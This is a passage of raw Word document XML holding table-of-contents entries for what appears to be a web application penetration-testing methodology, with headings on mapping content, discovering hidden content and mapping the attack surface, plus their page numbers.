          <w:hyperlink w:anchor="_Toc531104322" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Methodology</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104322 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6392F2FC" w14:textId="45D116BD" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104323" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Map the Applications Content</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104323 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1780A895" w14:textId="0A90E970" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104324" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1.1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Explore Visible Content</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104324 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3DD01959" w14:textId="69BC41BF" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104325" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1.2</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Discover Hidden Content</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104325 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="73692E2A" w14:textId="6C8520FB" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104326" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1.3</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Discover Default Content</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104326 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="251D025C" w14:textId="30D7154B" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104327" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1.4</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Enumerate Identifier-Specified Functions</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104327 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="64F05C0F" w14:textId="2D3BF449" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104328" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1.5</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Debug Parameters</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104328 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7408A714" w14:textId="6611E120" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104329" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.2</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Analyze the Application</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104329 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0AFE9F3B" w14:textId="027D6F33" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104330" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.2.1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Identify Functionality</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104330 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="652F62BD" w14:textId="0799F477" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104331" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.2.2</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Identify Data Entry Points</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104331 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="65EBD15D" w14:textId="4C9643FE" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104332" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.2.3</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Identify the Technologies Used</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104332 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="22CBBB6C" w14:textId="45EDB596" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104333" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.2.4</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Map the attack surface</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104333 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7CE1E184" w14:textId="6B0203C7" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
